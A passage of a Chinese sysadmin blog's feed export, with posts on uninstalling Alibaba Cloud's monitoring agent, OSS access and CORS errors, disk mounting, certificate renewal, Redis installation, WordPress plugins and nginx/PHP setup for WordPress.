&quot;&#x2F;etc&#x2F;rc.d&#x2F;rc$&#123;var&#125;.d&#x2F;S80aegis&quot;</span><br><span class="line">   fi</span><br><span class="line">  done</span><br><span class="line">    fi</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">stop_aegis</span><br><span class="line">stop_quartz</span><br><span class="line">uninstall_service</span><br><span class="line">remove_aegis</span><br><span class="line">remove_quartz</span><br><span class="line"></span><br><span class="line">printf &quot;%-40s %40s\n&quot; &quot;Uninstalling aegis_quartz&quot;  &quot;[  OK  ]&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;卸载阿里云背后脚本&quot;&gt;&lt;a href=&quot;#卸载阿里云背后脚本&quot; class=&quot;headerlink&quot; title=&quot;卸载阿里云背后脚本&quot;&gt;&lt;/a&gt;卸载阿里云背后脚本&lt;/h2&gt;&lt;figure class=&quot;highlight shell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;t</summary>
      
    
    
    
    <category term="运维部署" scheme="https://seniortesting.club/categories/%E8%BF%90%E7%BB%B4%E9%83%A8%E7%BD%B2/"/>
    
    <category term="网站部署" scheme="https://seniortesting.club/categories/%E8%BF%90%E7%BB%B4%E9%83%A8%E7%BD%B2/%E7%BD%91%E7%AB%99%E9%83%A8%E7%BD%B2/"/>
    
    
  </entry>
  
  <entry>
    <title>阿里云OSS对象存储报错AccessDenied</title>
    <link href="https://seniortesting.club/posts/rVk4W7nVEm/"/>
    <id>https://seniortesting.club/posts/rVk4W7nVEm/</id>
    <published>2021-03-25T15:16:38.000Z</published>
    <updated>2021-04-18T13:00:39.467Z</updated>
    
    <content type="html"><![CDATA[<h2 id="阿里云oss对象存储报错AccessDenied"><a href="#阿里云oss对象存储报错AccessDenied" class="headerlink" title="阿里云oss对象存储报错AccessDenied"></a>阿里云oss对象存储报错AccessDenied</h2><p>在外网访问任意的oss资源总是返回如下的报错信息:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;Error&gt;</span><br><span class="line">&lt;Code&gt;AccessDenied&lt;&#x2F;Code&gt;</span><br><span class="line">&lt;Message&gt;AccessDenied&lt;&#x2F;Message&gt;</span><br><span class="line">&lt;RequestId&gt;5F52E0DF2980C63833C17934&lt;&#x2F;RequestId&gt;</span><br><span class="line">&lt;HostId&gt;yanzhi-bucket.oss-cn-hangzhou.aliyuncs.com&lt;&#x2F;HostId&gt;</span><br><span class="line">&lt;&#x2F;Error&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>官方提到的解决方法是： <a href="https://help.aliyun.com/knowledge_detail/42777.html" target="_blank" rel="noopener">https://help.aliyun.com/knowledge_detail/42777.html</a> ， 提到排除问题为：<br>说明访问OSS的用户没有当前操作的权限。请确认使用的AccessKeyID/AccessKeySecret是正确的。如果使用的是子帐号或临时账户（STS），请确认当前用户的权限。在访问控制管理控制台单击 用户管理，单击 需要确认权限的用户，单击 用户授权策略 &gt; 加入组的授权策略查看该用户的权限，确认是否已经赋予当前用户Bucket或Object的操作权限。</p><p>但是其实相关的AccessKeyID/AccessKeySecret配置都是没有问题，用户也已经授权了。还是报这个错误。</p><h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><p>关闭“请求者付费”即可</p><p><img src="https://raw.githubusercontent.com/alterhu2020/StorageHub/master/img/20200905085147-2020-09-05.png" alt="20200905085147-2020-09-05"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;阿里云oss对象存储报错AccessDenied&quot;&gt;&lt;a href=&quot;#阿里云oss对象存储报错AccessDenied&quot; class=&quot;headerlink&quot; title=&quot;阿里云oss对象存储报错AccessDenied&quot;&gt;&lt;/a&gt;阿里云oss对象存储报错Ac</summary>
      
    
    
    
    <category term="运维部署" scheme="https://seniortesting.club/categories/%E8%BF%90%E7%BB%B4%E9%83%A8%E7%BD%B2/"/>
    
    <category term="网站部署" scheme="https://seniortesting.club/categories/%E8%BF%90%E7%BB%B4%E9%83%A8%E7%BD%B2/%E7%BD%91%E7%AB%99%E9%83%A8%E7%BD%B2/"/>
    
    
  </entry>
  
  <entry>
    <title>阿里云云盘挂载和挂载后复制数据文件</title>
    <link href="https://seniortesting.club/posts/QYCPbBJKqO/"/>
    <id>https://seniortesting.club/posts/QYCPbBJKqO/</id>
    <published>2021-03-25T15:16:38.000Z</published>
    <updated>2021-04-18T13:00:39.467Z</updated>
    
    <content type="html"><![CDATA[<h2 id="创建一个磁盘（云盘）"><a href="#创建一个磁盘（云盘）" class="headerlink" title="创建一个磁盘（云盘）"></a>创建一个磁盘（云盘）</h2><p>参考： <a href="https://help.aliyun.com/document_detail/32317.html" target="_blank" rel="noopener">https://help.aliyun.com/document_detail/32317.html</a></p><h2 id="实例挂载磁盘"><a href="#实例挂载磁盘" class="headerlink" title="实例挂载磁盘"></a>实例挂载磁盘</h2><p>参考： <a href="https://help.aliyun.com/document_detail/25446.html" target="_blank" rel="noopener">https://help.aliyun.com/document_detail/25446.html</a></p><h2 id="实例查看挂载的磁盘"><a href="#实例查看挂载的磁盘" class="headerlink" title="实例查看挂载的磁盘"></a>实例查看挂载的磁盘</h2><p>参考： <a href="https://www.cnblogs.com/fangts/p/10253887.html" target="_blank" rel="noopener">https://www.cnblogs.com/fangts/p/10253887.html</a></p><p>查看设备号后挂载指定的设备到一个文件夹目录上</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fdisk -l</span><br><span class="line">mount /dev/vdb1 /opt</span><br><span class="line">df </span><br></pre></td></tr></table></figure><h2 id="数据盘的卸载"><a href="#数据盘的卸载" class="headerlink" title="数据盘的卸载"></a>数据盘的卸载</h2><p>输入 <code>umount /dev/vdb1</code><br>如果提示设备忙，无法挂载</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fuser -km /dev/vdb1</span><br><span class="line">umount /dev/vdb1</span><br></pre></td></tr></table></figure><p>再删除/etc/fstab文件中，如下的数据</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/dev/vdb1  /data ext3    defaults    0  0</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;创建一个磁盘（云盘）&quot;&gt;&lt;a href=&quot;#创建一个磁盘（云盘）&quot; class=&quot;headerlink&quot; title=&quot;创建一个磁盘（云盘）&quot;&gt;&lt;/a&gt;创建一个磁盘（云盘）&lt;/h2&gt;&lt;p&gt;参考： &lt;a href=&quot;https://help.aliyun.com/d</summary>
      
    
    
    
    <category term="运维部署" scheme="https://seniortesting.club/categories/%E8%BF%90%E7%BB%B4%E9%83%A8%E7%BD%B2/"/>
    
    <category term="网站部署" scheme="https://seniortesting.club/categories/%E8%BF%90%E7%BB%B4%E9%83%A8%E7%BD%B2/%E7%BD%91%E7%AB%99%E9%83%A8%E7%BD%B2/"/>
    
    
  </entry>
  
  <entry>
    <title>阿里云对象存储字体文件访问报跨域错误</title>
    <link href="https://seniortesting.club/posts/I9WxdYe0MD/"/>
    <id>https://seniortesting.club/posts/I9WxdYe0MD/</id>
    <published>2021-03-25T15:16:38.000Z</published>
    <updated>2021-04-18T13:00:39.467Z</updated>
    
    <content type="html"><![CDATA[<h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>阿里云的oss对象存储遇到CORS跨域请求的问题，导致字体文件<code>woff,woff2,ttf</code>等格式不能访问，但是图片却在OSS可以访问。原因是OSS中配置对应的跨域请求配置<code>来源</code>参数不正确。来源参数应该是配置完整的请求地址，需要加上对应的<code>http://</code>或者<code>https://</code>.如果不能确定域名，可以打开浏览器的调试功能，查看Header中的<code>Origin</code>。</p><h3 id="配置项"><a href="#配置项" class="headerlink" title="配置项"></a>配置项</h3><p>CORS的配置方法一般是针对每个访问来源单独配置规则，勿将多个来源加到一个规则，多个规则之间不要有覆盖冲突。其它的选项只开放需要的权限即可。CORS配置有以下几项。</p><ul><li>来源（AllowedOrigin）：允许跨域请求的来源，可以同时指定多个来源。配置时需带上完整的域信息，例如：<a href="http://10.X.X.100:8001或https://www.aliyun.com。注意，不要遗漏了协议名http或https，如果端口不是默认的80，还需要带上端口。如果不能确定域名，可以打开浏览器的调试功能，查看Header中的Origin">http://10.X.X.100:8001或https://www.aliyun.com。注意，不要遗漏了协议名http或https，如果端口不是默认的80，还需要带上端口。如果不能确定域名，可以打开浏览器的调试功能，查看Header中的Origin</a>。域名支持<em>通配符，每个域名中允许最多使用一个</em>，例如https://<em>.aliyun.com。如果来源指定为</em>，则表示允许所有来源的跨域请求。</li><li>允许 Methods：按照需求开通对应的方法即可，调试时可以全部选择。</li><li>允许 Headers：允许的跨域请求Header。允许配置多条匹配规则，以回车间隔。在Access-Control-Request-Headers中指定的每个Header，都必须在Allowed Header中有对应项。Header容易遗漏，没有特殊需求的情况下，建议设置为*，表示允许所有，大小写不敏感。</li><li>暴露 Headers：暴露给浏览器的Header列表，即用户从应用程序中访问的响应头，例如一个Javascript的XMLHttpRequest对象。不允许使用通配符。具体的配置需要根据应用的需求确定，只暴露需要使用的Header。如果不需要暴露可以不填。大小写不敏感。该项是可选配置项。<br>缓存时间（MaxAgeSeconds）：浏览器对特定资源的预取请求（OPTIONS请求）返回结果的缓存时间，单位为秒。如果没有特殊情况可以稍大一点，比如60秒。该项是可选配置项。</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;问题&quot;&gt;&lt;a href=&quot;#问题&quot; class=&quot;headerlink&quot; title=&quot;问题&quot;&gt;&lt;/a&gt;问题&lt;/h2&gt;&lt;p&gt;阿里云的oss对象存储遇到CORS跨域请求的问题，导致字体文件&lt;code&gt;woff,woff2,ttf&lt;/code&gt;等格式不能访问，但是图片</summary>
      
    
    
    
    <category term="运维部署" scheme="https://seniortesting.club/categories/%E8%BF%90%E7%BB%B4%E9%83%A8%E7%BD%B2/"/>
    
    <category term="网站部署" scheme="https://seniortesting.club/categories/%E8%BF%90%E7%BB%B4%E9%83%A8%E7%BD%B2/%E7%BD%91%E7%AB%99%E9%83%A8%E7%BD%B2/"/>
    
    
    <category term="java" scheme="https://seniortesting.club/tags/java/"/>
    
    <category term="javascript" scheme="https://seniortesting.club/tags/javascript/"/>
    
  </entry>
  
  <entry>
    <title>阿里云对象存储自定义证书切换操作步骤</title>
    <link href="https://seniortesting.club/posts/piAq81HoXa/"/>
    <id>https://seniortesting.club/posts/piAq81HoXa/</id>
    <published>2021-03-25T15:16:38.000Z</published>
    <updated>2021-04-18T13:00:39.467Z</updated>
    
    <content type="html"><![CDATA[<h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>阿里云的对象存储采用的是自定义的let’s Encrypt证书，而非官方的付费证书。每三个月需要手动进行切换证书。</p><h2 id="操作步骤"><a href="#操作步骤" class="headerlink" title="操作步骤"></a>操作步骤</h2><ol><li>回到阿里云的<strong>域名解析服务</strong>中,将对应的对象存储<strong>绑定的域名解析到服务器的ip</strong>而<strong>非对应的对象存储设置的域名</strong>，类似于: <code>xxx.com.w.kunlunca.com</code></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">res.yitieyilu.com.w.kunlunca.com</span><br><span class="line"></span><br></pre></td></tr></table></figure><ol start="2"><li>回到对应的服务器上将该域名证书进行续期：</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certbot renew</span><br></pre></td></tr></table></figure><p>根据提示找到对应的renew后新的公钥私钥文件，例如: <code>etc/letsencrypt/live/xxx.com</code> 目录下面的公钥私钥文件: <code>fullchain.pem</code>, <code>privkey.pem</code>.</p><ol start="3"><li>回到CDN配置页面： <a href="https://cdnnext.console.aliyun.com/overview" target="_blank" rel="noopener">https://cdnnext.console.aliyun.com/overview</a>，在对应的域名下点击“管理”进行配置页面</li></ol><p><img src="https://raw.githubusercontent.com/alterhu2020/StorageHub/master/img/20200819090154-2020-08-19.png" alt="20200819090154-2020-08-19"></p><p>切换到”HTTPS配置”，点击“修改配置”, 在弹出的对话框中选择“自定义上传（证书+私钥）”，在内容中输入<code>fullchain.pem</code>文件中的内容，在“私钥”中输入: <code>privkey.pem</code>中的内容。点击确认即可完成。</p><ol start="4"><li><p>重新回到阿里云的域名解析服务中,将上面配置的对应的对象存储<strong>绑定的域名解析到服务器的ip</strong>改成<strong>对应的对象存储设置的域名</strong>，例如：<br><code>res.yitieyilu.com.w.kunlunca.com</code></p></li><li><p>回到对象存储页面点击一个上传的图片，通过自定义域名访问确认配置时候已经生效。</p></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;问题&quot;&gt;&lt;a href=&quot;#问题&quot; class=&quot;headerlink&quot; title=&quot;问题&quot;&gt;&lt;/a&gt;问题&lt;/h2&gt;&lt;p&gt;阿里云的对象存储采用的是自定义的let’s Encrypt证书，而非官方的付费证书。每三个月需要手动进行切换证书。&lt;/p&gt;
&lt;h2 id=&quot;</summary>
      
    
    
    
    <category term="运维部署" scheme="https://seniortesting.club/categories/%E8%BF%90%E7%BB%B4%E9%83%A8%E7%BD%B2/"/>
    
    <category term="网站部署" scheme="https://seniortesting.club/categories/%E8%BF%90%E7%BB%B4%E9%83%A8%E7%BD%B2/%E7%BD%91%E7%AB%99%E9%83%A8%E7%BD%B2/"/>
    
    
  </entry>
  
  <entry>
    <title>Redis Linux安装及其环境配置</title>
    <link href="https://seniortesting.club/posts/GdcsnlipSK/"/>
    <id>https://seniortesting.club/posts/GdcsnlipSK/</id>
    <published>2021-03-25T15:16:38.000Z</published>
    <updated>2021-04-18T13:00:39.459Z</updated>
    
    <content type="html"><![CDATA[<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install redis-server -y</span><br></pre></td></tr></table></figure><h2 id="修改配置文件"><a href="#修改配置文件" class="headerlink" title="修改配置文件"></a>修改配置文件</h2><p>只需要修改配置文件中的密码,修改端口号为： <strong>2963</strong></p><h2 id="卸载redis"><a href="#卸载redis" class="headerlink" title="卸载redis"></a>卸载redis</h2><p>您只需在终端中键入以下命令即可。这将删除 <code>redis-server</code> 软件包和不再需要的其他相关软件包（因为 <code>--auto-remove</code> 参数）。它还会删除 redis-server 的本地/配置文件（因为 purge 参数）。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get purge --auto-remove redis-server</span><br></pre></td></tr></table></figure><p>通过如下命令确认是否卸载干净:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-cache policy redis-server</span><br></pre></td></tr></table></figure><p>如果显示：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@serv:~# apt-cache policy redis-server</span><br><span class="line">redis-server:</span><br><span class="line">Installed: (none)</span><br></pre></td></tr></table></figure><p>表明卸载干净。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;安装&quot;&gt;&lt;a href=&quot;#安装&quot; class=&quot;headerlink&quot; title=&quot;安装&quot;&gt;&lt;/a&gt;安装&lt;/h2&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span </summary>
      
    
    
    
    <category term="软件开发" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/"/>
    
    <category term="中间件" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E4%B8%AD%E9%97%B4%E4%BB%B6/"/>
    
    <category term="redis" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E4%B8%AD%E9%97%B4%E4%BB%B6/redis/"/>
    
    
  </entry>
  
  <entry>
    <title>5个最佳WordPress通知栏插件</title>
    <link href="https://seniortesting.club/posts/kBDmyjmZOL/"/>
    <id>https://seniortesting.club/posts/kBDmyjmZOL/</id>
    <published>2021-03-25T15:16:38.000Z</published>
    <updated>2021-04-18T13:00:39.467Z</updated>
    
    <content type="html"><![CDATA[<p><strong>作者</strong>：品博客<br><strong>链接</strong>：<a href="https://seniortesting.club/328/">https://seniortesting.club/328/</a><br><strong>来源</strong>：品博客<br>著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</p><p><img src="https://upload-images.jianshu.io/upload_images/19646892-045cac48c6e1b013?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image"></p><p>WordPress通知栏可有效地将流量引至您期望的页面。此过程可以增加您网站的收入。通知栏可以显示有关您网站的重要公告，也可以使用该栏捕获访问者的电子邮件以增加订阅。这些栏对促进销售特别有用，这样用户就不会错过以折扣价购买产品和服务的机会，从而帮助您增加收入。现代的通知栏不仅功能强大，而且功能强大。他们也很有吸引力。在这篇文章中我们将介绍许多用于WordPress的惊人通知栏插件，它们具有精美的设计和几个自定义选项，以使之成为最适合您网站的通知插件。</p><h2 id="优秀通知栏插件列表"><a href="#优秀通知栏插件列表" class="headerlink" title="优秀通知栏插件列表"></a>优秀通知栏插件列表</h2><h3 id="1-WP-Notification-Bar-Pro"><a href="#1-WP-Notification-Bar-Pro" class="headerlink" title="1. WP Notification Bar Pro"></a>1. WP Notification Bar Pro</h3><p>WP Notification Bar Pro是MyThemeShop的高质量，高级通知栏插件，可为您提供成功通知栏中可能需要的一切。该工具提供了电子邮件选择栏，纯文本通知栏或带有号召性用语按钮的通知栏。关于栏的外观和功能，您有很多选择。该插件具有无限的配色方案，完全响应的设计以及显示或隐藏栏的不同选项。您也可以使用此通知栏显示最多18个社交媒体平台。<br><img src="https://upload-images.jianshu.io/upload_images/19646892-534542593d9f7316?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image"></p><h3 id="2-Superbar"><a href="#2-Superbar" class="headerlink" title="2. Superbar"></a>2. Superbar</h3><p>Superbar是Wordpress的现代通知栏。它带有大量的自定义可能性，使该插件成为该列表中最好的选择之一。</p><p>您可以创建一个漂亮的登录栏，以允许您的用户快速登录到您的站点。Superbar也可以充当搜索表单。如果您的站点处理视频，事件或任何类型的教程，则可以为用户提供一种快速在栏中查看重要视频的方法。</p><p>Superbar还可以在您的网站上显示最近的帖子，以吸引更多用户使用您的内容。</p><p><img src="https://upload-images.jianshu.io/upload_images/19646892-f95f34404cebbe45?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="Superbar WordPress通知栏"></p><h3 id="3-Hello-Bar"><a href="#3-Hello-Bar" class="headerlink" title="3.Hello Bar"></a>3.Hello Bar</h3><p>Hello Bar是可用于WordPress的最受欢迎和使用最广泛的通知栏插件之一。您可以免费安装和使用此插件。尽管它是一个免费插件，但是您会发现很多选项和功能，可以为您的网站创建一个吸引人的通知栏。在后端，您可以定义号召性用语链接，消息和栏的颜色以及号召性用语按钮。您将获得该栏的实时预览，以查看其在您的网站上的外观。您也可以使用此插件来捕获用户电子邮件。它提供了一个吸引人的电子邮件捕获界面，您可以将通知栏连接到电子邮件服务。<br><img src="https://upload-images.jianshu.io/upload_images/19646892-2e4040490a511c69?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="Hello Bar WordPress通知栏插件"></p><h3 id="4-Foobar-WordPress通知栏"><a href="#4-Foobar-WordPress通知栏" class="headerlink" title="4. Foobar-WordPress通知栏"></a>4. Foobar-WordPress通知栏</h3><p>Foobar是一个非常有效且流行的高级通知插件。您可以在网站的不同页面上实现不同的栏，因此可以在特定页面上推广产品。Foobar是完全可定制的，有30多个选项可以制作适合您网站的通知栏。</p><p><img src="https://upload-images.jianshu.io/upload_images/19646892-c7fdc4a9773003b2?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="Foobar通知栏"></p><h3 id="5-Royal-Footer-Bar"><a href="#5-Royal-Footer-Bar" class="headerlink" title="5.Royal Footer Bar"></a>5.Royal Footer Bar</h3><p>Royal Footer Bar是另一个高质量的WordPress通知栏插件；它是许多人的最爱，因为它看起来很专业，并提供大量令人惊叹的功能。您可以创建自定义消息以推广特殊优惠，创建电子邮件选择栏或展示社交链接。您可以选择进行A / B / C拆分测试，以查看哪种类型的条形效果最佳并相应地实施。它还在通知栏上为您提供有关活动的详细统计信息。<br><img src="https://upload-images.jianshu.io/upload_images/19646892-602fe2ebec8e5d82?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="Royal Footer Bar WordPress插件"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;作者&lt;/strong&gt;：品博客&lt;br&gt;&lt;strong&gt;链接&lt;/strong&gt;：&lt;a href=&quot;https://seniortesting.club/328/&quot;&gt;https://seniortesting.club/328/&lt;/a&gt;&lt;br&gt;&lt;strong&gt;来</summary>
      
    
    
    
    <category term="运维部署" scheme="https://seniortesting.club/categories/%E8%BF%90%E7%BB%B4%E9%83%A8%E7%BD%B2/"/>
    
    <category term="网站部署" scheme="https://seniortesting.club/categories/%E8%BF%90%E7%BB%B4%E9%83%A8%E7%BD%B2/%E7%BD%91%E7%AB%99%E9%83%A8%E7%BD%B2/"/>
    
    <category term="wordpress" scheme="https://seniortesting.club/categories/%E8%BF%90%E7%BB%B4%E9%83%A8%E7%BD%B2/%E7%BD%91%E7%AB%99%E9%83%A8%E7%BD%B2/wordpress/"/>
    
    
  </entry>
  
  <entry>
    <title>Wordpress Linux命令其环境配置</title>
    <link href="https://seniortesting.club/posts/nNyuTGIiKf/"/>
    <id>https://seniortesting.club/posts/nNyuTGIiKf/</id>
    <published>2021-03-25T15:16:38.000Z</published>
    <updated>2021-04-18T13:00:39.467Z</updated>
    
    <content type="html"><![CDATA[<p><strong>更新日期： 2020/02/21</strong></p><h2 id="Install-wordpress"><a href="#Install-wordpress" class="headerlink" title="Install wordpress"></a>Install wordpress</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;www&#x2F;web&#x2F;blog.seniortesting.club</span><br><span class="line">wget https:&#x2F;&#x2F;wordpress.org&#x2F;latest.tar.gz</span><br><span class="line">tar xpf latest.tar.gz</span><br><span class="line">cp -r wordpress ..&#x2F;</span><br></pre></td></tr></table></figure><h2 id="Install-php"><a href="#Install-php" class="headerlink" title="Install php"></a>Install php</h2><p>以下方法不再推荐使用， 2020-07-20<br><del>$ cd /opt</del><br><del>$ wget <a href="https://www.php.net/distributions/php-7.3.10.tar.gz" target="_blank" rel="noopener">https://www.php.net/distributions/php-7.3.10.tar.gz</a></del><br><del>$ tar zxvf php-7.3.10.tar.gz</del></p><p>如下为最新安装方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">----------上面采用的php源码安装可以使用下面的几个命令替代-----------------------------</span><br><span class="line">$ sudo apt update</span><br><span class="line">$ sudo apt-get install php-fpm php-mysql -y</span><br><span class="line"></span><br><span class="line">上面的命令会安装: php-common php7.3-cli php7.3-common php7.3-fpm php7.3-json php7.3-mysql php7.3-opcache php7.3-readline</span><br><span class="line">可以看到对应的路径为: &#x2F;run&#x2F;php&#x2F;php7.3-fpm.sock,另外安装了服务： sudo systemctl status php7.3-fpm</span><br><span class="line"></span><br><span class="line">$ sudo apt install php-curl php-gd php-intl php-mbstring php-soap php-xml php-xmlrpc php-zip</span><br><span class="line">$ sudo nano &#x2F;etc&#x2F;php&#x2F;7.3&#x2F;fpm&#x2F;php.ini</span><br><span class="line"></span><br><span class="line">;  Paths and Directories</span><br><span class="line"></span><br><span class="line">cgi.fix_pathinfo &#x3D; 0</span><br><span class="line"></span><br><span class="line">$ sudo systemctl restart php7.3-fpm.service</span><br></pre></td></tr></table></figure><h2 id="配置nginx"><a href="#配置nginx" class="headerlink" title="配置nginx"></a>配置nginx</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">root &#x2F;www&#x2F;web&#x2F;www.seniortesting.club;</span><br><span class="line">index index.html index.htm index.php;</span><br><span class="line"></span><br><span class="line">location &#x2F; &#123;</span><br><span class="line">    try_files $uri $uri&#x2F; &#x2F;index.php?$args;</span><br><span class="line">&#125;</span><br><span class="line">location ~ \.php$ &#123;</span><br><span class="line">    try_files $uri &#x3D;404;</span><br><span class="line">    fastcgi_pass unix:&#x2F;run&#x2F;php&#x2F;php7.3-fpm.sock;</span><br><span class="line">    fastcgi_index   index.php;</span><br><span class="line">    fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;</span><br><span class="line">    include fastcgi_params;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>有时候我们可以看到另外的一种配置，也是可行的，不过有点麻烦，如下代码:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">        listen        80;</span><br><span class="line">        server_name  localhost;</span><br><span class="line">        root   &quot;D:&#x2F;WWW&quot;;</span><br><span class="line">        location &#x2F; &#123;</span><br><span class="line">            index index.php index.html;</span><br><span class="line">            error_page 400 &#x2F;error&#x2F;400.html;</span><br><span class="line">            error_page 403 &#x2F;error&#x2F;403.html;</span><br><span class="line">            error_page 404 &#x2F;error&#x2F;404.html;</span><br><span class="line">            error_page 500 &#x2F;error&#x2F;500.html;</span><br><span class="line">            error_page 501 &#x2F;error&#x2F;501.html;</span><br><span class="line">            error_page 502 &#x2F;error&#x2F;502.html;</span><br><span class="line">            error_page 503 &#x2F;error&#x2F;503.html;</span><br><span class="line">            error_page 504 &#x2F;error&#x2F;504.html;</span><br><span class="line">            error_page 505 &#x2F;error&#x2F;505.html;</span><br><span class="line">            error_page 506 &#x2F;error&#x2F;506.html;</span><br><span class="line">            error_page 507 &#x2F;error&#x2F;507.html;</span><br><span class="line">            error_page 509 &#x2F;error&#x2F;509.html;</span><br><span class="line">            error_page 510 &#x2F;error&#x2F;510.html;</span><br><span class="line">            autoindex  off;</span><br><span class="line">           # 修复phpstudy链接修改为固定链接后文章详情页面报404错误</span><br><span class="line">           if (-f $request_filename&#x2F;index.html)&#123;</span><br><span class="line">               rewrite (.*) $1&#x2F;index.html break;</span><br><span class="line">           &#125;</span><br><span class="line">           if (-f $request_filename&#x2F;index.php)&#123;</span><br><span class="line">               rewrite (.*) $1&#x2F;index.php;</span><br><span class="line">           &#125;</span><br><span class="line">           if (!-f $request_filename)&#123;</span><br><span class="line">               rewrite (.*) &#x2F;index.php;</span><br><span class="line">           &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        # 上面配置后后台不能访问了，仔细观察发现后台所有地址都缺少wp-admin目录</span><br><span class="line">        rewrite &#x2F;wp-admin$ $scheme:&#x2F;&#x2F;$host$uri&#x2F; permanent;</span><br><span class="line">        location ~ \.php(.*)$ &#123;</span><br><span class="line">            fastcgi_pass   127.0.0.1:9000;</span><br><span class="line">            fastcgi_index  index.php;</span><br><span class="line">            fastcgi_split_path_info  ^((?U).+\.php)(&#x2F;?.+)$;</span><br><span class="line">            fastcgi_param  SCRIPT_FILENAME  $document_root$fastcgi_script_name;</span><br><span class="line">            fastcgi_param  PATH_INFO  $fastcgi_path_info;</span><br><span class="line">            fastcgi_param  PATH_TRANSLATED  